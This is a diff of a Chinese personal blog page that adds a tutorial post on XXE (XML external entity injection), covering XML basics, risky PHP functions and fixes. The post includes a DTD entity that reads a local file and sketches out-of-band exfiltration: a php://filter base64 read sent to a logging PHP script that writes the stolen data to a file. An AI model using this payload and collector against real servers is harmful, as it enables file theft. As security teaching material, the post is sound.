@@ -20,17 +20,17 @@
     var CONFIG = {"hostname":"dtxharry.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="随便写点自己的笔记">
+  <meta name="description" content="XXE定义, 如何寻找XXE">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XXE实体注入">
 <meta property="og:url" content="https://dtxharry.github.io/2023/08/21/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Dtx&#39;s Realm">
-<meta property="og:description" content="随便写点自己的笔记">
+<meta property="og:description" content="XXE定义, 如何寻找XXE">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-08-21T08:42:23.000Z">
-<meta property="article:modified_time" content="2023-08-21T08:42:23.175Z">
+<meta property="article:modified_time" content="2023-08-21T14:49:56.352Z">
 <meta property="article:author" content="dtxHarry">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="XXE">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="https://dtxharry.github.io/2023/08/21/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/">
@@ -222,11 +222,22 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-08-21 16:42:23" itemprop="dateCreated datePublished" datetime="2023-08-21T16:42:23+08:00">2023-08-21</time>
+              <time title="创建时间：2023-08-21 16:42:23 / 修改时间：22:49:56" itemprop="dateCreated datePublished" datetime="2023-08-21T16:42:23+08:00">2023-08-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">XXE实体注入</span></a>
+                </span>
             </span>
 
           
+            <div class="post-description">XXE定义, 如何寻找XXE</div>
 
         </div>
       </header>
@@ -237,7 +248,24 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <h1 id="XXE定义"><a href="#XXE定义" class="headerlink" title="XXE定义"></a>XXE定义</h1><p>XXE   ==  xml外部实体注入 (被各种后端脚本调用)<br>          =&gt;XML只存数据,除此以外不会做任何事情 (像HTML | 传输数据 | 无预定义)<br>          =&gt; 外部实体<br>          =&gt;注入 [用户输入的数据被当做代码执行]</p>
+<h1 id="XML定义"><a href="#XML定义" class="headerlink" title="XML定义"></a>XML定义</h1><p>XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTMLXML 的设计宗旨是传输数据，而非显示数据<br>XML 标签没有被预定义。您需要自行定义标签。XML 被设计为具有自我描述性。<br>XML 是 W3C 的推荐标准</p>
+<p>特点：<br>XML仅仅是纯文本，他不会做任何事情。<br>XML可以自己发明标签（允许定义自己的标签和文档结构）<br>XML 无所不在。</p>
+<p>XML 是各种应用程序之间进行数据传输的最常用的工具，并且在信息存储和描述领域变得越来越流行</p>
+<p>前端代码:<br>                <code>&lt;b&gt;&lt;/b&gt;</code>加粗<br>                <code>&lt;h1&gt;&lt;/h1&gt;</code>大标题<br>XML:<br>                <code>&lt;b&gt;&lt;/b&gt;</code> 名字而已<br>                <code>&lt;h1&gt;&lt;/h1&gt;</code>名字而已</p>
+<h1 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h1><p>​    <code>&lt;?xml version=&quot;1.0&quot;?&gt;</code>     //文件头部分</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">scan</span> [<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/1.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line">//DTD部分（通过特殊的命令去其他文件读取信息,就是文件包含,使用的关键字为SYSTEM）</span><br><span class="line">其中,scan是标签</span><br><span class="line"></span><br><span class="line">//test相当于自定义了变量,让包含的文件写入到test实体中</span><br></pre></td></tr></table></figure>
+<p>​    <code>&lt;scan&gt;&amp;test;&lt;/scan&gt;</code>            //XML部分,表示test实体作用范围为scan标签</p>
+<h1 id="XXE的寻找"><a href="#XXE的寻找" class="headerlink" title="XXE的寻找"></a>XXE的寻找</h1><h2 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h2><h3 id="高危函数"><a href="#高危函数" class="headerlink" title="高危函数"></a>高危函数</h3><p>simplexml_load_string()  //调用xml字符串并转换为实体对象<br>simplexml_load_file()     //读取xml文件并转化为实体对象</p>
+<h3 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h3><p>大部分的xxe是没有回显的，我们不知道是否调用,所以可以考虑把数据外带出来：<br>    1、获取信息<br>    2、发送信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">XSS平台：	</span><br><span class="line">	你打XSS到目标站点 -&gt; 有人访问后把数据传到平台 -&gt; 记录下来，等你来看</span><br><span class="line"></span><br><span class="line">XML: 请求一个你自己搭建的php文件，其他的文件。（你想要的数据给带出来）</span><br><span class="line">	 php文件记录请求的传参内容（记录文件）</span><br><span class="line">	 等你去看就可以了</span><br></pre></td></tr></table></figure>
+<p>1.xml : 请求访问’<a target="_blank" rel="noopener" href="http://127.0.0.1/WWW/2.php?id=%file">http://127.0.0.1/WWW/2.php?id=%file</a>‘.</p>
+<p>1.php : (1) 将”PHP://filter/read=convert.base64-encode/resource=1.txt”实体化为 %file对象;<br>            (2)让 % remote 包含 1.xml 并执行<br>            (3)将(1)和(2)变为一个xml 类型的字符串 ,再实体化为 test</p>
+<p>2.PHP : file_put_contents(“3.txt”,$_GET[“id”],FILE_APPEND); //php中的写文件函数,把id传参扩展追             加到3.TXT的内容后</p>
+<h4 id="file-正常情况下是网站不应该使用的协议"><a href="#file-正常情况下是网站不应该使用的协议" class="headerlink" title="file:/// 正常情况下是网站不应该使用的协议"></a>file:/// 正常情况下是网站不应该使用的协议</h4><p>PHP伪协议（PHP的内部协议）<br>php://filter/read=convert.base64-encode/resource=a.txt</p>
+<h4 id="为什么要进行base64编码"><a href="#为什么要进行base64编码" class="headerlink" title="为什么要进行base64编码?"></a>为什么要进行base64编码?</h4><p>以免特殊字符影响传参 :  <code>http://XXXX.php?id=12#45&amp;id=67</code> 这里可能会被认为是锚点导致传参不完整</p>
+<h2 id="2、看到数据包莫名其妙传递、返回XML代码-可以试试XXE"><a href="#2、看到数据包莫名其妙传递、返回XML代码-可以试试XXE" class="headerlink" title="2、看到数据包莫名其妙传递、返回XML代码,可以试试XXE"></a>2、看到数据包莫名其妙传递、返回XML代码,可以试试XXE</h2><h1 id="修复XXE的方法"><a href="#修复XXE的方法" class="headerlink" title="修复XXE的方法"></a>修复XXE的方法</h1><p>​    1、libxml_disable_entity_loader(true);  PHP的函数（禁止加载XML实体）<br>​    2、过滤SYSTEM关键字</p>
+
     </div>
 
     
@@ -262,6 +290,9 @@
 
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/XXE/" rel="tag"># XXE</a>
+          </div>
 
         
 
@@ -335,6 +366,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E5%AE%9A%E4%B9%89"><span class="nav-text">XXE定义</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XML%E5%AE%9A%E4%B9%89"><span class="nav-text">XML定义</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XML%E7%BB%93%E6%9E%84"><span class="nav-text">XML结构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E7%9A%84%E5%AF%BB%E6%89%BE"><span class="nav-text">XXE的寻找</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">1.代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0"><span class="nav-text">高危函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6"><span class="nav-text">数据外带</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#file-%E6%AD%A3%E5%B8%B8%E6%83%85%E5%86%B5%E4%B8%8B%E6%98%AF%E7%BD%91%E7%AB%99%E4%B8%8D%E5%BA%94%E8%AF%A5%E4%BD%BF%E7%94%A8%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="nav-text">file:&#x2F;&#x2F;&#x2F; 正常情况下是网站不应该使用的协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8Cbase64%E7%BC%96%E7%A0%81"><span class="nav-text">为什么要进行base64编码?</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E7%9C%8B%E5%88%B0%E6%95%B0%E6%8D%AE%E5%8C%85%E8%8E%AB%E5%90%8D%E5%85%B6%E5%A6%99%E4%BC%A0%E9%80%92%E3%80%81%E8%BF%94%E5%9B%9EXML%E4%BB%A3%E7%A0%81-%E5%8F%AF%E4%BB%A5%E8%AF%95%E8%AF%95XXE"><span class="nav-text">2、看到数据包莫名其妙传递、返回XML代码,可以试试XXE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8DXXE%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">修复XXE的方法</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -357,13 +389,13 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">21</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
